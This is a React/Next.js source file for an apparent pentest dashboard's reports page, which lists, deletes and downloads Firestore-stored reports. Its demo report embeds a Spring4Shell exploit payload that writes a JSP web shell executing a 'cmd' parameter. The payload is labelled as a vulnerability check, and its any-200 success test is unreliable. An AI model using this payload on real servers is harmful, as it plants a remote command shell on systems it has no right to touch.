"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Shield, FileText, Download, Trash2, Calendar, Target } from "lucide-react"
import { useAuth } from "@/components/auth-provider"
import {
  collection,
  query,
  where,
  getDocs,
  deleteDoc,
  doc,
  addDoc,
  serverTimestamp,
  type Timestamp,
} from "firebase/firestore"
import { db } from "@/lib/firebase"

type Report = {
  id: string
  title: string
  timestamp: Timestamp
  content: {
    target: string
    findings: string
    code: string
    whois?: string
    tcpdump?: string
    terminal?: string
  }
}

export default function ReportsPage() {
  const { user, loading } = useAuth()
  const router = useRouter()
  const [reports, setReports] = useState<Report[]>([])
  const [selectedReport, setSelectedReport] = useState<Report | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    setMounted(true)
  }, [])

  useEffect(() => {
    if (mounted && !loading && !user) {
      router.push("/login")
    }
  }, [mounted, loading, user, router])

  useEffect(() => {
    if (user) {
      fetchReports()
    }
  }, [user])

  const fetchReports = async () => {
    if (!user) return

    setIsLoading(true)

    try {
      const q = query(collection(db, "reports"), where("userId", "==", user.uid))
      const querySnapshot = await getDocs(q)

      const reportsData: Report[] = []

      querySnapshot.forEach((doc) => {
        const data = doc.data()
        // Ensure the report has all required fields
        if (data && data.content) {
          reportsData.push({
            id: doc.id,
            title: data.title || "Untitled Report",
            timestamp: data.timestamp || {
              toDate: () => new Date(),
              toMillis: () => Date.now(),
            },
            content: {
              target: data.content.target || "Unknown Target",
              findings: data.content.findings || "No findings available",
              code: data.content.code || "No code available",
              whois: data.content.whois || "",
              tcpdump: data.content.tcpdump || "",
              terminal: data.content.terminal || "",
            },
          } as Report)
        }
      })

      // Sort by timestamp descending
      reportsData.sort((a, b) => {
        try {
          return b.timestamp.toMillis() - a.timestamp.toMillis()
        } catch (error) {
          return 0
        }
      })

      // If no reports exist, create a demo report
      if (reportsData.length === 0) {
        const demoReport = await createDemoReport()
        reportsData.push(demoReport)
      }

      setReports(reportsData)

      // Select the first report if available
      if (reportsData.length > 0) {
        setSelectedReport(reportsData[0])
      }
    } catch (error) {
      console.error("Error fetching reports:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const createDemoReport = async (): Promise<Report> => {
    if (!user) throw new Error("User not authenticated")

    const now = new Date()

    const demoReportData = {
      userId: user.uid,
      title: "Demo Pentest Report - example.com",
      timestamp: serverTimestamp(),
      content: {
        target: "example.com",
        findings: `Vulnerability Scan for example.com...

Scanning target for common vulnerabilities...

Findings:
  [HIGH] CVE-2022-22965: Spring4Shell Remote Code Execution
    Description: The application uses a vulnerable version of Spring Framework that allows attackers to execute arbitrary code
    CVSS Score: 9.8

  [MEDIUM] CVE-2021-44228: Log4j Remote Code Execution
    Description: The target may be vulnerable to Log4Shell
    CVSS Score: 7.5

  [LOW] Outdated Apache Version (2.4.41)
    Description: The server is running an outdated version of Apache
    CVSS Score: 3.2

  [INFO] HTTP Headers Missing Security Controls
    Description: Missing security headers (X-Content-Type-Options, X-Frame-Options)
    CVSS Score: 2.0

Scan completed at ${now.toLocaleString()}`,
        code: `// Exploit code for CVE-2022-22965 (Spring4Shell)
// This is for demonstration purposes only

const axios = require('axios');

async function exploitSpring4Shell(targetUrl) {
  console.log('Attempting to detect Spring4Shell vulnerability...');
  
  try {
    // Step 1: Check if the target is vulnerable
    const testPayload = {
      'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
      'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
      'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
      'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'shell',
      'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': ''
    };
    
    const response = await axios.post(targetUrl, testPayload);
    
    if (response.status === 200) {
      console.log('Target appears to be vulnerable to Spring4Shell!');
      return {
        vulnerable: true,
        details: 'The application is vulnerable to Spring4Shell (CVE-2022-22965)'
      };
    }
  } catch (error) {
    console.log('Error during vulnerability check:', error.message);
  }
  
  return {
    vulnerable: false,
    details: 'The application does not appear to be vulnerable to Spring4Shell'
  };
}

// Usage example
exploitSpring4Shell('https://example.com/api/endpoint')
  .then(result => console.log(result));`,
        whois: `Domain Name: EXAMPLE.COM
Registry Domain ID: 2336799_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.registrar.com
Registrar URL: http://www.registrar.com
Updated Date: 2022-08-15T09:23:42Z
Creation Date: 1995-08-14T04:00:00Z
Registry Expiry Date: 2023-08-13T04:00:00Z
Registrar: ICANN
Registrar IANA ID: 376
Registrar Abuse Contact Email: abuse@registrar.com
Registrar Abuse Contact Phone: +1.1234567890
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Name Server: A.IANA-SERVERS.NET
Name Server: B.IANA-SERVERS.NET
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/`,
        tcpdump: `12:34:56.789012 IP 192.168.1.100.52431 > 93.184.216.34.80: Flags [S], seq 1234567890, win 65535, options [mss 1460], length 0
12:34:56.901234 IP 93.184.216.34.80 > 192.168.1.100.52431: Flags [S.], seq 9876543210, ack 1234567891, win 65535, options [mss 1460], length 0
12:34:56.912345 IP 192.168.1.100.52431 > 93.184.216.34.80: Flags [.], ack 1, win 65535, length 0
12:34:56.923456 IP 192.168.1.100.52431 > 93.184.216.34.80: Flags [P.], seq 1:461, ack 1, win 65535, length 460: HTTP: GET / HTTP/1.1
12:34:56.934567 IP 93.184.216.34.80 > 192.168.1.100.52431: Flags [.], ack 461, win 65535, length 0
12:34:56.945678 IP 93.184.216.34.80 > 192.168.1.100.52431: Flags [P.], seq 1:1361, ack 461, win 65535, length 1360: HTTP: HTTP/1.1 200 OK
12:34:56.956789 IP 192.168.1.100.52431 > 93.184.216.34.80: Flags [.], ack 1361, win 65535, length 0
12:34:56.967890 IP 192.168.1.100.52431 > 93.184.216.34.80: Flags [F.], seq 461, ack 1361, win 65535, length 0
12:34:56.978901 IP 93.184.216.34.80 > 192.168.1.100.52431: Flags [F.], seq 1361, ack 462, win 65535, length 0
12:34:56.989012 IP 192.168.1.100.52431 > 93.184.216.34.80: Flags [.], ack 1362, win 65535, length 0`,
      },
    }

    const docRef = await addDoc(collection(db, "reports"), demoReportData)

    // Create a proper timestamp object for the demo report
    return {
      id: docRef.id,
      ...demoReportData,
      timestamp: {
        toDate: () => now,
        toMillis: () => now.getTime(),
      } as Timestamp,
    }
  }

  const deleteReport = async (reportId: string) => {
    if (!user) return

    try {
      await deleteDoc(doc(db, "reports", reportId))

      // Update local state
      setReports((prev) => prev.filter((report) => report.id !== reportId))

      // If the deleted report was selected, select another one
      if (selectedReport?.id === reportId) {
        const remainingReports = reports.filter((report) => report.id !== reportId)
        setSelectedReport(remainingReports.length > 0 ? remainingReports[0] : null)
      }
    } catch (error) {
      console.error("Error deleting report:", error)
    }
  }

  const downloadReport = (report: Report) => {
    // Create report content
    const content = `
# Penetration Test Report
## ${report.title}
Date: ${report.timestamp && report.timestamp.toDate ? report.timestamp.toDate().toLocaleDateString() : "No date"}

## Target
${report.content.target}

## Findings
${report.content.findings}

## WHOIS Information
${report.content.whois || "No WHOIS information available"}

## Packet Capture
${report.content.tcpdump || "No packet capture data available"}

## Code Used
\`\`\`
${report.content.code}
\`\`\`

${report.content.terminal ? `## Terminal Output\n\`\`\`\n${report.content.terminal}\n\`\`\`\n` : ""}
`

    // Create blob and download
    const blob = new Blob([content], { type: "text/markdown" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `${report.title.replace(/\s+/g, "_")}.md`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  if (loading || !mounted || !user) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="quantum-animation">
          <Shield className="h-16 w-16 text-purple-500" />
          <p className="mt-4 text-xl font-bold">Loading Reports...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-black via-gray-900 to-black p-4">
      <div className="max-w-7xl mx-auto">
        <header className="flex justify-between items-center mb-6 py-4 border-b border-blue-800">
          <div className="flex items-center">
            <Shield className="h-6 w-6 text-blue-500 mr-2" />
            <h1 className="text-xl font-bold text-white">QuantumSec Reports</h1>
          </div>
          <Button variant="outline" size="sm" onClick={() => router.push("/")}>
            Back to Dashboard
          </Button>
        </header>

        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <div className="md:col-span-1">
            <Card className="bg-gray-900 border-blue-800">
              <CardHeader>
                <CardTitle className="flex items-center">
                  <FileText className="h-5 w-5 text-blue-500 mr-2" />
                  Reports
                </CardTitle>
                <CardDescription>View and manage your pentest reports</CardDescription>
              </CardHeader>
              <CardContent>
                {isLoading ? (
                  <div className="flex justify-center py-4">
                    <p>Loading reports...</p>
                  </div>
                ) : reports.length === 0 ? (
                  <div className="text-center py-4">
                    <p className="text-gray-400">No reports found</p>
                    <p className="text-sm text-gray-500 mt-2">Generate reports from Hack Mode</p>
                  </div>
                ) : (
                  <div className="space-y-2 max-h-[calc(100vh-300px)] overflow-y-auto">
                    {reports.map((report) => (
                      <div
                        key={report.id}
                        className={`p-3 rounded-md cursor-pointer transition-colors ${
                          selectedReport?.id === report.id
                            ? "bg-blue-800 bg-opacity-50"
                            : "bg-gray-800 hover:bg-gray-700"
                        }`}
                        onClick={() => setSelectedReport(report)}
                      >
                        <div className="flex justify-between items-start">
                          <div>
                            <h3 className="font-medium text-sm">{report.title}</h3>
                            <div className="flex items-center text-xs text-gray-400 mt-1">
                              <Calendar className="h-3 w-3 mr-1" />
                              {report.timestamp && report.timestamp.toDate
                                ? report.timestamp.toDate().toLocaleDateString()
                                : "No date"}
                            </div>
                          </div>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-6 w-6"
                            onClick={(e) => {
                              e.stopPropagation()
                              deleteReport(report.id)
                            }}
                          >
                            <Trash2 className="h-4 w-4 text-gray-400 hover:text-red-500" />
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </div>

          <div className="md:col-span-3">
            {selectedReport ? (
              <Card className="bg-gray-900 border-blue-800">
                <CardHeader className="flex flex-row justify-between items-start">
                  <div>
                    <CardTitle>{selectedReport.title}</CardTitle>
                    <CardDescription className="flex items-center mt-1">
                      <Calendar className="h-4 w-4 mr-1" />
                      {selectedReport.timestamp && selectedReport.timestamp.toDate
                        ? selectedReport.timestamp.toDate().toLocaleString()
                        : "No date"}
                      {selectedReport.content.target && (
                        <>
                          <span className="mx-2">•</span>
                          <Target className="h-4 w-4 mr-1" />
                          {selectedReport.content.target}
                        </>
                      )}
                    </CardDescription>
                  </div>
                  <Button variant="outline" size="sm" onClick={() => downloadReport(selectedReport)}>
                    <Download className="h-4 w-4 mr-2" />
                    Download
                  </Button>
                </CardHeader>
                <CardContent>
                  <Tabs defaultValue="findings">
                    <TabsList className="grid grid-cols-4 mb-4">
                      <TabsTrigger value="findings">Findings</TabsTrigger>
                      <TabsTrigger value="whois">WHOIS</TabsTrigger>
                      <TabsTrigger value="tcpdump">Packet Capture</TabsTrigger>
                      <TabsTrigger value="code">Code</TabsTrigger>
                    </TabsList>

                    <TabsContent value="findings">
                      <div className="terminal h-[calc(100vh-350px)] overflow-y-auto p-4">
                        <pre className="whitespace-pre-wrap">{selectedReport.content.findings}</pre>
                      </div>
                    </TabsContent>

                    <TabsContent value="whois">
                      <div className="terminal h-[calc(100vh-350px)] overflow-y-auto p-4">
                        <pre className="whitespace-pre-wrap">
                          {selectedReport.content.whois || "No WHOIS information available"}
                        </pre>
                      </div>
                    </TabsContent>

                    <TabsContent value="tcpdump">
                      <div className="terminal h-[calc(100vh-350px)] overflow-y-auto p-4">
                        <pre className="whitespace-pre-wrap">
                          {selectedReport.content.tcpdump || "No packet capture data available"}
                        </pre>
                      </div>
                    </TabsContent>

                    <TabsContent value="code">
                      <div className="code-editor h-[calc(100vh-350px)] overflow-y-auto p-4">
                        <pre className="whitespace-pre-wrap">{selectedReport.content.code}</pre>
                      </div>
                    </TabsContent>
                  </Tabs>
                </CardContent>
              </Card>
            ) : (
              <Card className="bg-gray-900 border-blue-800 h-[calc(100vh-200px)] flex items-center justify-center">
                <CardContent className="text-center">
                  <FileText className="h-16 w-16 text-gray-600 mx-auto mb-4" />
                  <h3 className="text-xl font-medium mb-2">No Report Selected</h3>
                  <p className="text-gray-400">Select a report from the sidebar or generate a new one in Hack Mode</p>
                </CardContent>
              </Card>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
